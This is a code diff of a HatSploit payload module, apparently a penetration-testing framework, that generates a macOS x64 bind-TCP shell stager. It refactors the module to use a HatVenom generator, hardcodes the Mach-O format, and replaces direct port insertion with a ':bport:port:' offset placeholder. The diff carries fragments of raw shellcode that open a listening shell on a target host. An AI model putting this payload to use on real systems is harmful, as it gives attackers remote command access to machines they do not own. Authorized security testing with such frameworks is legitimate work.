@@ -25,10 +25,10 @@
 #
 
 from core.lib.payload import Payload
-from utils.payload.payload import PayloadGenerator
+from utils.hatvenom.hatvenom import HatVenom
 
 
-class HatSploitPayload(Payload, PayloadGenerator):
+class HatSploitPayload(Payload, HatVenom):
     details = {
         'Category': "stager",
         'Name': "macOS x64 Shell Bind TCP",
@@ -55,22 +55,15 @@ class HatSploitPayload(Payload, PayloadGenerator):
             'Value': 8888,
             'Type': "port",
             'Required': True
-        },
-        'FORMAT': {
-            'Description': "Executable format.",
-            'Value': "macho",
-            'Type': None,
-            'Required': True
         }
     }
 
     def run(self):
-        bind_port, executable_format = self.parse_options(self.options)
-        bind_port = self.port_to_bytes(bind_port)
+        bind_port = self.parse_options(self.options)
 
-        if executable_format not in self.formats.keys():
-            self.output_error("Invalid executable format!")
-            return None
+        offsets = {
+            'bport': bind_port
+        }
 
         self.output_process("Generating shellcode...")
         shellcode = (
@@ -90,7 +83,7 @@ class HatSploitPayload(Payload, PayloadGenerator):
             b"\x48\x31\xf6"      # xorq  %rsi, %rsi
             b"\x56"              # pushq  %rsi
             b"\xbe\x01\x02"      # movl  port, %esi
-            + bind_port +        # port
+            b":bport:port:"      # port
             b"\x83\xee\x01"      # subl  $1, %esi
             b"\x56"              # pushq  %rsi
             b"\x48\x89\xe6"      # movq  %rsp, %rsi
@@ -127,6 +120,6 @@ class HatSploitPayload(Payload, PayloadGenerator):
         )
 
         self.output_process("Generating payload...")
-        payload = self.generate(executable_format, 'x64', shellcode)
+        payload = self.generate('macho', 'x64', shellcode, offsets)
 
         return payload
